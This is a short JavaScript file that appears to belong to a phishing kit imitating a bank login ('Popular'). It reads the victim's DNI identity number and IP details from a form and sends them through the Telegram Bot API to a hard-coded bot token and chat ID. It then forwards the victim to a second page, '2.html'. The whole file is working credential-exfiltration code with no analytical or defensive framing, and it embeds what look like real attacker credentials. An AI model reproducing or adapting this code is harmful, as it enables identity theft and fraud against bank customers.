//bot token
var telegram_bot_id = "7547078867:AAHcois8_f3hQhn4_YygqvaTAqOa6_UEUJ4";
//chat id
var chat_id = "6491109915";
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("usuario").value;
 
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "-Popular-\nDNI: " + u_name + "\nip" + ip +"\n" + ip2 +"\n-LOGIN-";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = '2.html';
        console.log(response);
    });
    return false;
};
